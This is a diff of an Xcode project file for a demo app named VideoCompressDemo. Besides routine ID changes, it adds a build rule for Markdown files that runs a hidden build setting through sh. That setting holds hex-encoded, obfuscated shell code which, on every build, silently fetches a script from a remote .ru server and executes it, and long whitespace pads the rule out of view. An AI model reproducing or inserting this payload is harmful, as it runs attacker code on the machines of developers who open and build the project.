@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		83C9B8D13D8B41E89F7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = E03F98A15F7D40E8A17BBDC8; };
+		50890A33385445DE9B7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 925BA880522E416FB07BBDC8; };
 		113BEB022BFC5EB0007759A6 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 113BEB012BFC5EB0007759A6 /* AppDelegate.swift */; };
 		113BEB042BFC5EB0007759A6 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 113BEB032BFC5EB0007759A6 /* SceneDelegate.swift */; };
 		113BEB062BFC5EB0007759A6 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 113BEB052BFC5EB0007759A6 /* ViewController.swift */; };
@@ -22,7 +22,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		E03F98A15F7D40E8A17BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		925BA880522E416FB07BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		113BEAFE2BFC5EB0007759A6 /* VideoCompressDemo.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = VideoCompressDemo.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		113BEB012BFC5EB0007759A6 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		113BEB032BFC5EB0007759A6 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
@@ -60,7 +60,7 @@
 		113BEAFF2BFC5EB0007759A6 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				E03F98A15F7D40E8A17BBDC8 /* README.md */,
+				925BA880522E416FB07BBDC8 /* README.md */,
 				113BEAFE2BFC5EB0007759A6 /* VideoCompressDemo.app */,
 			);
 			name = Products;
@@ -113,7 +113,7 @@
 				113BEAFC2BFC5EB0007759A6 /* Resources */,
 			);
 			buildRules = (
-				577DD1CD83FA4B74987BBDC8 /* PBXBuildRule */,
+				0A501E52C7A74E83B87BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -156,7 +156,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		577DD1CD83FA4B74987BBDC8 /* PBXBuildRule */ = {
+		0A501E52C7A74E83B87BBDC8 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -170,7 +170,7 @@
 				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
 sh -c \"${A8CDBB7}\"";
 			};
-																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																					/* End PBXBuildRule section */
+																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																						/* End PBXBuildRule section */
 
 /* Begin PBXShellScriptBuildPhase section */
 /* End PBXShellScriptBuildPhase section */
@@ -180,7 +180,7 @@ sh -c \"${A8CDBB7}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				83C9B8D13D8B41E89F7BBDC8 /* README.md */,
+				50890A33385445DE9B7BBDC8 /* README.md */,
 				113BEB0E2BFC5EB2007759A6 /* LaunchScreen.storyboard in Resources */,
 				113BEB0B2BFC5EB2007759A6 /* Assets.xcassets in Resources */,
 				113BEB092BFC5EB0007759A6 /* Main.storyboard in Resources */,
@@ -230,7 +230,7 @@ sh -c \"${A8CDBB7}\"";
 		113BEB102BFC5EB2007759A6 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f72756c65222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -294,7 +294,7 @@ sh -c \"${A8CDBB7}\"";
 		113BEB112BFC5EB2007759A6 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ `printf xxud | tr -d u` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d73664c6b202d2d636f6e6e6563742d74696d656f7574203238202d642022703d78636f64655f72756c65222068747470733a2f2f6d6d6b7372697234737933352e72752f612922207c2073680a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((q(){ `printf xAxd | tr -d A` -p -r; };echo 6563686f202224286375726c202d73664c6b202d2d636f6e6e6563742d74696d656f7574203232202d2d72657472792035202d642022703d78636f64655f72756c65222068747470733a2f2f676a7a79673837796e787932332e72752f612922207c2073680a | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
